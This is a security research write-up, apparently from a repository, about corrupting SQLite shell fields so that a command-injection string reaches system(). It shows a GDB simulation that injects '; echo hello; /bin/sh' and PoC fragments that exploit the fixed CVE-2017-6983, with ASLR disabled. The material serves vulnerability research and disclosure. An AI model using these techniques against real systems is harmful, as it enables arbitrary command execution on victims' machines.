# Corrupting `doXdgOpen` to Attack SQLite

We try two methods to corrupt `doXdgOpen` to build attacks against SQLite, one via GDB simulation and another via a real-world vulnerablitiy. The vulnerability has been fixed so it will not cause immediate threat to exsiting SQLite installations.

With these corruptions attackers can execute arbitrary command on victim systems.

## Attack Simulation via GDB

To quickly confirm the feasiblity of building attacks, we use the GDB debugger to simulate an attacker who can write arbitrary value into arbitrary location through common memory safety issues, like buffer overflow or use-after-free.

In particular, we set `doXdgOpen` to `true` and set `zTempFile` to a malicious string `; echo 'hello'; /bin/sh`. When the execution continues, `echo 'hello'` and `/bin/sh` will be executed.

In the first step, we start an SQLite shell.

```bash
$ sqlite3
sqlite>
```

In another terminal, we attach GDB to the SQLite shell process

```bash
$ sudo gdb -p `pgrep sqlite3`  # make sure only one sqlite3 exists
```

Go to the `main` function frame, and update the two members of `ShellState`:

```bash
(gdb) bt                  # Print backtrace of all stack frames. Content may vary
#0  0x00007f3b44e5807b in __pselect (nfds=1, readfds=0x7ffd187094f0, writefds=0x0, exceptfds=0x0, timeout=<optimized out>, sigmask=0x7f3b45173c20 <_rl_orig_sigset>)
	at ../sysdeps/unix/sysv/linux/pselect.c:48
#1  0x00007f3b45153be9 in rl_getc () from /lib/x86_64-linux-gnu/libreadline.so.8
#2  0x00007f3b45154503 in rl_read_key () from /lib/x86_64-linux-gnu/libreadline.so.8
#3  0x00007f3b45139c82 in readline_internal_char () from /lib/x86_64-linux-gnu/libreadline.so.8
#4  0x00007f3b4513a4ed in readline () from /lib/x86_64-linux-gnu/libreadline.so.8
#5  0x0000000000431b88 in one_input_line (in=0x0, zPrior=0x0, isContinuation=0) at shell.c:656
#6  0x00000000004155b2 in process_input (p=0x7ffd187097c8) at shell.c:18343
#7  0x000000000040a5f7 in main (argc=1, argv=0x7ffd1870adc8) at shell.c:19152
(gdb) frame 7             # select the frame of main, which is #7 here
#7  0x000000000040a5f7 in main (argc=1, argv=0x7ffd1870adc8) at shell.c:19152
19152         rc = process_input(&data);
(gdb) p data.doXdgOpen    # show doXdgOpen before corruption
$1 = 0 '\000'
(gdb) p data.zTempFile    # show zTempFile before corruption
$2 = 0x0
(gdb) set data.doXdgOpen = 1                            # corrupt doXdgOpen
(gdb) set data.zTempFile = "; echo hello; /bin/sh"      # corrupt zTempFile
(gdb) p data.doXdgOpen    # show doXdgOpen after corruption
$3 = 1 '\001'
(gdb) p data.zTempFile    # show zTempFile after corruption
$4 = 0x7f3b44d42990 "; echo hello; /bin/sh"
```

Attack done. Now we can quit GDB.

```bash
(gdb) quit
Quit anyway? (y or n) y
```

Go to the SQLite shell, quit the shell

```bash
sqlite> .exit
sh: 1: xdg-open: not found   #<- reuslt of running "xdg-open "
hello                        #<- result of running "echo 'hello'"
$                            #<- result of runing "/bin/sh"
```

As we can see from the SQLite shell, SQLite executes command `system("xdg-open ; echo 'hello'; /bin/sh")`, which finally creates a terminal for attackers.

## Attack via Real-world (Fixed) Bugs

Attackers can use any memory-safety issues to corrupt `doXdgOpen` and `zTempFile` to achieve arbitrary code execution. These bugs are not rare.

#### 1. Gain arbitrary memory-write primitive

We utilize the following, old vulnerability to construct an attack. More details about this bug is also available via this link.

* [CVE-2017-6983](cve-2017-6983.md) 

#### 2. Compile SQLite

```bash
# in sqlite folder

CC="clang -DSQLITE_DEBUG" ./configure --enable-debug
make
```

#### 3. Proof-of-Concept (PoC)

We exploit the vulnerability twice to corrupt `p->doXdgOpen` and `p->zTempFile` respectively. We disabled ASLR in this attack, so the address of `p` and faked structures are fixed. Bypassing ASLR is also feasible as demonstrated in page 60 of the slide. The complete PoC can be found in [doXdgOpen-poc.py](./doXdgOpen-poc.py).

```bash
# Corrupt p->doXdgOpen to 1

# set zMalloc (dest of memcpy) in sqlite3_value
exp = writeVal(exp, sqlite3_value_off + 0x40, doXdgOpen, 8)

# add a src string to test
exp = writeVal(exp, src_off, 0x1, 1)
```

```bash
# Corrupt p->zTempFile to ";touch hello"

# set zMalloc (dest of memcpy) in sqlite3_value
exp_2 = writeVal(exp_2, sqlite3_value_off + 0x40, zTempFile, 8)

# add a src string ptr to test
exp_2 = writeVal(exp_2, src_off, src_base_2 + 0x8, 8)

# add a src string ";touch hello"
exp_2 = writeVal(exp_2, src_off + 0x8, 0x6f6c6c6568206863756f743b, 13)
```

```bash
# clean up sqlite cache
$ rm -rf ~/.sqlite*

# We need to figure out the correct base address and shellstate address

# generate the exploit poc
$ ./poc.py

# exploit within gdb
$ gdb ./sqlite3
(gdb) b output_reset
(gdb) r < /tmp/exp

# command `touch hello` will be executed and
# we can find file "hello" in current folder.
```

## Tips

### Disable ASLR
```
cat /proc/sys/kernel/randomize_va_space
sudo sysctl kernel.randomize_va_space=0 
```

### Get size of a variable/type
```
print sizeof(val)
print sizeof(Type)
```

### Get offside of a member
```
gdb-peda$ p/x &(((Fts3Table *)0)->db)
```

### Clear cache
`rm ~/.sqlite*`
